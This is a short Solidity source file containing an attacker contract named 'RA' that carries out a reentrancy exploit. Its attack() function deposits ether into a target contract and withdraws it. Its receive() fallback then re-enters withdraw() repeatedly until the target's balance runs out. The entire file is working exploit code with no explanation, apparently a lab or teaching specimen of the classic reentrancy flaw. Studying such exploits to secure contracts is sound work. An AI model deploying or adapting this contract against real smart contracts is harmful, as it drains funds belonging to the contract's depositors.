// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IReentrancy {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

contract RA {
    IReentrancy private immutable target;

    constructor(address targetAddress) {
        target = IReentrancy(targetAddress);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) target.withdraw(msg.value);
    }
}
